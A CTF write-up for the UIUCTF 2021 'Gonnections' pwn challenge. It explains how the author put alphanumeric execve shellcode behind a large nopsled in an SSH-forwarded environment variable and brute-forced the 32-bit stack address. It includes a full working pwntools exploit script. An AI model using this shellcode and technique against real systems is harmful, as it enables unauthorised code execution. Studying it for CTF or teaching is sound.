Gonnections was a pwn challenge from UIUCTF 2021,

written by kmh. it was a tricky one..

the binary and a dockerfile was provided.

let's do a quick check on the binary:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/UIUCTF.2021/pwn/gonnegtions/imgs/ek4orX0.png)

as we can see this a 32bit binary, with stack executable, and PIE on.

the binary working is very simple and quick to reverse.

let's examine it on IDA:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/UIUCTF.2021/pwn/gonnegtions/imgs/HUYXQfE.png)

basically, the challenge ask for a 32bit address, and jump to it.

that's all...

PIE in 32bit mode has only 12bit of ASLR in address, so it is possible to bruteforce the addresses in a reasonnable amount of time,

depending on connection speed, and server responsiveness..could take minute or some hours..  still doable...

the settings of the challenge, was a bit weird, you can connect to the binary, via SSH, via a tcp port, or via a UDP port..

the libc was 2.31, and the docker was based on ubuntu 20.04..

my first tries were to bruteforce one gadgets address, but the registers at the time of the jump (call eax),

were not good for executing onegadgets..

so I try different tricks, ret2main, etc... nothing works...

then I stop, and think a bit :)

if stack is RWX, that indicates that probably a shellcode has to be executed on stack.. and the 32bit setting indicates a bit of bruteforce probably..

but how to put a shellcode on stack, with such a minimal binary...

well the answer was environnement variables, and to use the SSH connection to the binary.

a quick check in the sshd_config in the docker, confirm that you can pass LC_* & LANG env variable

to the remote program.  And of course , env variables will be stored on stack, and can be pretty big..

so the attack strategy was to put an alphanumeric shellcode with a big nopsled in a env variable,

and to bruteforce the stack address to jump in it...

with a 130000 bytes nopsled, only around 7 bits of ASLR are left to guess (1/128) which is easier...

the jump to the function is a CALL EAX instruction, so EAX will contain the address where we jump.

my alphanumeric shellcode is a self modifying code, that needs EAX to contains beginning address of shellcode.

so we will use INC EAX (@ in ascii) in our nopsled, like this, anywhere we jump in the nopsled,

when the shellcode will be reached, EAX will be adjusted to the beginning of our shellcode..perfect !!

so here is the exploit code:

```python
from pwn import *
context.log_level = 'error'
import os

# execve 32bit alphanumeric shellcode (need eax points to shellcode)
shellcode = 'j014d34d1p21pBZV34dN1pAX40PZRhUUshXf5zzPhUbinX4zPTkj0X40PSTYjOX4D2O'
# environement variable to put shellcode on stack, 130000 bytes nopsled beforce (inc eax)
os.environ['LC_PIPO'] = '@'*130000 + shellcode

tries = 0
while tries<100:
  print(str(tries))
  if args.LOCAL:
    p = process('sshpass -p gonnegtions ssh -T -o SendEnv=LC_PIPO -p 1339 wolfsheim@127.0.0.1', shell=True)
  else:
    p = process('sshpass -p gonnegtions ssh -T -o SendEnv=LC_PIPO -p 1339 wolfsheim@44.197.95.129', shell=True)
  p.sendlineafter('to? ', str(0xffd38000))
  try:
    p.recv(1,timeout=1)
    p.sendline('id;cat /flag.txt;')
    p.interactive()
  except:
    p.close()
    tries += 1
```


ok see it in action :)

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/UIUCTF.2021/pwn/gonnegtions/imgs/6D4CbDG.gif)


*nobodyisnobody for RootMeUpBeforeYouGoGo*